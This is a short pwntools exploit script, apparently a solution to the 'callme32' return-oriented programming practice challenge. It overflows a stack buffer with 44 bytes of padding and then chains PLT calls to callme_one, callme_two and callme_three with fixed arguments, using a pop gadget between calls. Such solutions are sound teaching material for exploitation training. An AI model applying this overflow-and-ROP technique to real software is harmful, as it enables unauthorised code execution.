from pwn import *
import sys

BINARY = "./callme32"

def gensc():
    e=ELF(BINARY,checksec=False)

    sc='A'*44
    add8pop=p32(0x08048576)
    args=p32(1)+p32(2)+p32(3)

    sc+=p32(e.plt['callme_one'])
    sc+=add8pop
    sc+=args
    sc+=p32(e.plt['callme_two'])
    sc+=add8pop
    sc+=args
    sc+=p32(e.plt['callme_three'])
    sc+=p32(e.plt['exit'])
    sc+=args

    return sc

def exploit(r):
    r.recvuntil('> ')
    r.sendline(gensc())
    print r.recvall()
    return

if __name__=="__main__":

    r = process(BINARY)
    exploit(r)